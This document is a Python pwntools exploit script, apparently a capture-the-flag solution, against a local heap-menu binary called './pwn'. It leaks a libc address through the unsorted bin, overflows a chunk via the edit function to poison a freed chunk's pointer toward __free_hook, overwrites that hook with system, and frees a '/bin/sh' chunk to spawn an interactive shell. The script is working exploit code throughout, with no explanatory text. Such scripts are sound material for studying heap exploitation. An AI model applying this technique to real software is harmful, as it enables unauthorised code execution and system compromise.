from pwn import *
context.log_level = "debug"
context.binary = "./pwn"

p = process("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter(">> " , str(c))

def add(name,size,goods):
    p.sendlineafter(">> ","1")
    p.sendafter("Order name:",name)
    p.sendlineafter("How many:", str(size))
    p.sendafter("Goods' name:",goods)
    # p.recvuntil("Success !")

def edit(index,name,goods):
    p.sendlineafter(">> ","2")
    p.sendlineafter("Which one?\n", str(index))
    p.sendafter("New name:", name)
    p.sendafter("New goods:",goods)

def pay(index):
    p.sendlineafter(">> ","4")
    p.sendlineafter("Which one?",str(index))


add("0\n" , 0x80 , "0" * 0x20)
add("1\n" , 0x50 , "1" * 0x20)
for i in range(7):
    add(str(i) + "\n" , 0x80 , str(i) * 0x20)
for i in range(8 , 1 , -1):
    pay(i)
pay(0) 
for i in range(7):
    add(str(i) + "\n" , 0x80 , str(i) * 0x20) 
add("7\n" , 0x80 , "z" * 0x8)
p.recvuntil("z" * 0x8)
libc.address = u64(p.recvuntil("\x7f").ljust(8 , "\x00")) - 0x60 - 0x3EBC40

pay(1)
add("overwrite\n" , 0x91 + 0x30 + 0x60 , "z" * 0x80) # for overwirte && free check
edit(8 , "a" * 0x28, "a" * 0x80 + p64(0) + p64(0x31) + "a" * 0x28 + p64(0x61) + p64(libc.sym["__free_hook"]) + "\n" )
add("/bin/sh\x00\n" , 0x50 , "1st\n")
add("overwrite _free_hook\n" , 0x50 , p64(libc.sym["system"]) )

pay(9)
p.interactive()
